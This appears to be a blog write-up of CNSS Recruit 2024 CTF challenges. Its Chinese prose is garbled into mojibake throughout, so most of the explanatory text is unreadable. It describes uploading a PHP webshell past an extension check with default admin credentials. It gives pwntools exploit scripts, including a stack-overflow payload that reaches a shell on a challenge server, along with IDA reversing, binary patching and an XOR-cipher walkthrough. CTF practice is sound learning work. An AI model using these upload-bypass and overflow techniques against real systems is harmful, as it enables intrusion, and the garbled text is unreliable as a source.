<p>è´¦å·å¯†ç éƒ½æ˜¯adminç™»é™†ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚æ”¹ä¸€ä¸‹åç¼€ç»•è¿‡æ£€æŸ¥ï¼Œå…ˆæŠŠphpæ”¹æˆpngï¼Œä¸Šèšå‰‘è¿æ¥getshellå³å¯ã€‚</p>
<h1 id="ğŸ’¥Pwn"><a href="#ğŸ’¥Pwn" class="headerlink" title="ğŸ’¥Pwn"></a>ğŸ’¥Pwn</h1><p>PwnçœŸæ˜¯å¤ªæœ‰è¶£è¾£ï¼ä»é›¶å¼€å§‹çš„PWNä¹‹è·¯ï¼</p>
<h2 id="ğŸ˜¯nc-nc"><a href="#ğŸ˜¯nc-nc" class="headerlink" title="ğŸ˜¯nc? nc!"></a>ğŸ˜¯nc? nc!</h2><p>nc 152.136.11.155 10020</p>
<p>system(â€˜&#x2F;bin&#x2F;shâ€™)ï¼Œç›´æ¥netcatä¸€é”®getshellï¼ŒLinuxè¿æ¥ï¼Œcat flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nc 152.136.11.155 10020                       </span><br><span class="line">Welcome to CNSS Recruit 2024!</span><br><span class="line">Start your journey to become a pwn master!</span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">cnss&#123;Welcome_to_pwn_world!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ğŸ¤–Bot"><a href="#ğŸ¤–Bot" class="headerlink" title="ğŸ¤–Bot"></a>ğŸ¤–<strong>Bot</strong></h2><p>å·å·å‘Šè¯‰ä½ ï¼ŒCNSSå¨˜boté‡Œå…¶å®è—äº†ä¸€ä¸ªäººã€‚</p>
<p>å‰ä»»ä¸­ä¹‹äººShinoï¼Œéšç€å¹´çºªæ¸é•¿ï¼Œå·²ç»æ— æ³•æ»¡è¶³ç¾¤å‹æ—¥ç›Šå¢é•¿çš„æ°´ç¾¤éœ€æ±‚ã€‚CNSSå¨˜è¿«åˆ‡éœ€è¦æ–°çš„æ¥ç­äººï¼</p>
<p>ä¸ºäº†ä¸è¢«ç¾¤å‹è¯†ç ´ï¼Œä½ éœ€è¦æŒ‰ç…§æ“ä½œè§„èŒƒæ°´ç¾¤ï¼šå®Œæˆ100æ¬¡äº¤äº’å³å¯é€šè¿‡è€ƒæ ¸ã€‚</p>
<p>nc 152.136.11.155 10021</p>
<blockquote>
<p>æœ‰ä¸ªå¾ˆå¥½ç”¨çš„åº“å«pwntoolsï¼</p>
</blockquote>
<p>ä¸€é“Pwntooläº¤äº’é¢˜ã€‚ç¨‹åºçš„é€»è¾‘å°±æ˜¯å¾ªç¯100æ¬¡åè·³å‡ºå¾ªç¯ï¼Œæ‰§è¡Œsystemå‡½æ•°ã€‚åœ¨å¾ªç¯å†…éƒ¨ä¼šæ‰§è¡Œbroadcastæˆ–bot_pingè¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;152.136.11.155&#x27;</span></span><br><span class="line">port = <span class="number">10021</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data = p.recvline().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;[SYSTEM]&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\[SYSTEM\]\[(.*?)\]\((\d+)pt\)--\[(.*?)\]\((\d+)pt\)&#x27;</span>, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            player_id = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            player_score = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">            item_name = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">            item_score = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">            expected_response = <span class="string">f&quot;Congratulations to <span class="subst">&#123;player_id&#125;</span> for passing [<span class="subst">&#123;item_name&#125;</span>], current score is <span class="subst">&#123;player_score + item_score&#125;</span> points!&quot;</span></span><br><span class="line">            p.sendline(expected_response.encode())</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;[USER]&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;#ping&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">            p.sendline(<span class="string">&#x27;pong!&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;Too Slow&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Timeout or unexpected issue occurred.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Unhandled data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">cnss&#123;GnAlPu8Q-KL65ZOTK-hahahaha-U9BvTeeI&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="ğŸ’“Overflow-Me"><a href="#ğŸ’“Overflow-Me" class="headerlink" title="ğŸ’“Overflow Me"></a>ğŸ’“<strong>Overflow Me</strong></h2><p>å°æ•°ç»„è¦è¢«å¡æ»¡äº†ï¼</p>
<p>nc 152.136.11.155 10022</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line">  __int64 v5; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  my_init(argc, argv, envp);</span><br><span class="line">  puts(<span class="string">&quot;Over flow me pls:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, 0x20uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;wrong,try again&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åŸºç¡€çš„æ ˆæº¢å‡ºã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;152.136.11.155&#x27;</span></span><br><span class="line">port = <span class="number">10022</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">16</span></span><br><span class="line">payload = <span class="string">b&#x27;p&#x27;</span> * padding + p64(<span class="number">114514</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Over flow me pls:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">cnss&#123;Kz20UZyn-TNTfrc4Z-jiejiejie-sDwO2bC0&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<h1 id="ğŸ”Reverse"><a href="#ğŸ”Reverse" class="headerlink" title="ğŸ”Reverse"></a>ğŸ”Reverse</h1><p>è¿™ä¸ªå¤å¤©ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è¿‘äº†é‚£ä¸ªå¥³äººã€‚</p>
<h2 id="ğŸ˜é‚£ä¸ªå¥³äºº"><a href="#ğŸ˜é‚£ä¸ªå¥³äºº" class="headerlink" title="ğŸ˜é‚£ä¸ªå¥³äºº"></a>ğŸ˜<strong>é‚£ä¸ªå¥³äºº</strong></h2><p>ä¸Šè¯¾çš„æ—¶å€™Shinoè€å¸ˆè®²äº†ä¸€ä¸ªå·¥å…·å¯ä»¥ç”¨æ¥é€†å‘è½¯ä»¶ï¼Œä½†æ˜¯Timlzhå¿˜æ‰è½¯ä»¶å«ä»€ä¹ˆäº†ï¼Œåªè®°å¾—å¤´åƒæ˜¯é‚£ä¸ªå¥³äººâ€¦â€¦</p>
<p><img src="/../images/CNSS-Summer-2024/4.png" alt="IDA 1"></p>
<p>æˆåŠŸå®‰è£…IDA Proï¼Œæ‰“å¼€å³å¾—flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CNSS&#123;Sh3_1s_IDA!W3lc0m3_t0_Rev3rse_W0rld!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ğŸ˜­æˆ‘çš„flagç¢äº†ä¸€åœ°"><a href="#ğŸ˜­æˆ‘çš„flagç¢äº†ä¸€åœ°" class="headerlink" title="ğŸ˜­æˆ‘çš„flagç¢äº†ä¸€åœ°"></a>ğŸ˜­<strong>æˆ‘çš„flagç¢äº†ä¸€åœ°</strong></h2><p>æˆ‘çš„flagç¢æ‰äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾å›æ¥å—ï¼Ÿ</p>
<blockquote>
<p>ç”¨IDAæ‰“å¼€æ‰¾flagã€å­¦ä¼šåœ¨IDAä¸­ä½¿ç”¨F5ã€‚</p>
</blockquote>
<p><img src="/../images/CNSS-Summer-2024/5.png" alt="IDA 2"></p>
<p>æ‰“å¼€IDAå‘ç°ä¸‰ä¸ªhintï¼Œ<code>Shift+F12</code>èƒ½æ‰“å¼€Stringsï¼Œæ‰¾åˆ°ç¬¬ä¸€éƒ¨åˆ†ï¼›å·¦ä¾§Functionsæ ä¸Šæ–¹æ‰¾åˆ°ç¬¬äºŒéƒ¨åˆ†ï¼›æ ¹æ®æç¤ºï¼Œ<code>X</code>æŸ¥çœ‹äº¤å‰å¼•ç”¨ï¼Œæ‰¾åˆ°funs718ï¼Œ<code>F5</code>çœ‹åˆ°</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func718</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;718&quot;</span>);</span><br><span class="line">  <span class="built_in">br0ken_4parT_</span>();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">66</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">117</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">55</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">89</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">48</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">117</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">99</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">64</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">110</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œputcharç»™çš„ä¸å®Œæ•´ï¼Œé€€å›å»èƒ½çœ‹åˆ°å®Œæ•´çš„æœ€åä¸€éƒ¨åˆ†ï¼Œæ‹¿åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CNSS&#123;My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="âœˆï¸æ‰“é£æœºé«˜æ‰‹"><a href="#âœˆï¸æ‰“é£æœºé«˜æ‰‹" class="headerlink" title="âœˆï¸æ‰“é£æœºé«˜æ‰‹"></a>âœˆï¸<strong>æ‰“é£æœºé«˜æ‰‹</strong></h2><p>ä½ ä¼šæ‰“é£æœºå—ï¼Ÿé«˜åˆ†æœ‰å¥–å“¦ï¼âœˆï¸</p>
<blockquote>
<p>Patch Program</p>
</blockquote>
<p>æ‰¾ç¨‹åºæ¼æ´ï¼Œä¿®æ”¹é€»è¾‘ä»¥å‡ºç°flag</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">Startup</span>();</span><br><span class="line">  <span class="keyword">while</span> ( IsOver )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">UpdateInput</span>();</span><br><span class="line">    <span class="built_in">UpdateNormal</span>();</span><br><span class="line">    <span class="built_in">Show</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t\tYou Are so WEAK!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">Sleep</span>(<span class="number">0x9C4u</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">HideCursor</span>();</span><br><span class="line">  <span class="built_in">gotoxy</span>(<span class="number">1LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">26</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">61</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( canvas[<span class="number">62</span> * i + j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="built_in">printf</span>(asc_14001301C);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">printf</span>(&amp;asc_14001301C[<span class="number">2</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">          <span class="built_in">printf</span>(&amp;asc_14001301C[<span class="number">4</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">if</span> ( canvas[<span class="number">62</span> * i + j] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( canvas[<span class="number">62</span> * i + j] == <span class="number">4</span> )</span><br><span class="line">              <span class="built_in">printf</span>(&amp;asc_14001301C[<span class="number">8</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(&amp;asc_14001301C[<span class="number">6</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;asc_14001301C[<span class="number">10</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nScore: %d&quot;</span>, score);</span><br><span class="line">  result = score;</span><br><span class="line">  <span class="keyword">if</span> ( score &gt; <span class="number">1145141918</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\tWell Done! You got the flag!\n\t\t&quot;</span>);</span><br><span class="line">    <span class="built_in">get_flag</span>(); <span class="comment">// å‘ç°å¯ç–‘å‡½æ•°!!!</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0x9C4u</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å‡½æ•°å¼€å¤´ç›´æ¥æ”¾ä¸Šå¯ç–‘å‡½æ•°å³å¯ï¼ŒEdit-Patch Program-Assembleï¼Œå³é”®ã€é€€å‡ºã€é¼ æ ‡ç‚¹å‡»ç©ºç™½å¤„å°±å¯ä»¥çœ‹åˆ°å˜åŒ–åçš„ä»£ç ï¼Œæœ€åè®°å¾—Apply Patches toâ€¦</p>
<p><img src="/../images/CNSS-Summer-2024/6.png" alt="IDA 3"></p>
<p>è¿è¡Œä¿®æ”¹å¥½çš„exeç¨‹åºï¼Œæ‹¿åˆ°flag</p>
<p><img src="/../images/CNSS-Summer-2024/7.png" alt="Patch"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnss&#123;w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="â™¾ï¸äº¦çœŸäº¦æˆ–äº¦å‡"><a href="#â™¾ï¸äº¦çœŸäº¦æˆ–äº¦å‡" class="headerlink" title="â™¾ï¸äº¦çœŸäº¦æˆ–äº¦å‡"></a>â™¾ï¸<strong>äº¦çœŸäº¦æˆ–äº¦å‡</strong></h2><p>å°Šå˜Ÿå‡å˜Ÿ? O.o</p>
<p>çº¯åŠ å¯†é¢˜ï¼Œæ ¹æ®é¢˜ç›®ä¸éš¾çŒœæ˜¯å¼‚æˆ–ç›¸å…³çš„ã€‚IDAæ‰“å¼€ä»¥å<code>Ctrl+F</code>æŸ¥ä¸€ä¸‹<code>main</code>å‡½æ•°ï¼Œçœ‹ä¸€ä¸‹ä»£ç é€»è¾‘</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD v4[<span class="number">12</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  _QWORD v6[<span class="number">12</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+F0h] [rbp+70h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0x731047656E6F7579LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0x761B45794B10407DLL</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0x6E005B71491F585FLL</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">0x45045205575D01LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6[<span class="number">4</span>], <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">eNc0d3</span>(v4); <span class="comment">// å‘ç°å¯ç–‘ç‚¹ï¼Œè¿™é‡Œå¯¹v4è¿›è¡Œäº†åŠ å¯†</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">30</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">eNc0d3</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">26</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(a1 + i);</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œè¯»å–flagåœ°å€åŠ ä¸Š<code>i</code>åç§»ä½ç½®çš„ä¸€ä¸ªå­—èŠ‚ã€‚å°†v3å’Œè¯»å–åˆ°çš„å­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œç»“æœå†™å›åˆ°åŒä¸€ä½ç½®ã€‚</p>
<p>ä¸»å‡½æ•°å¾ªç¯æ˜¯åœ¨æ¯”è¾ƒåŠ å¯†åv4å’Œv6çš„å‰30ä¸ªå­—èŠ‚æ˜¯å¦ç›¸åŒï¼Œä¹Ÿå°±æ˜¯ç»™æˆ‘ä»¬å¯†æ–‡v6ï¼Œè¿˜åŸæ˜æ–‡å³å¯ã€‚</p>
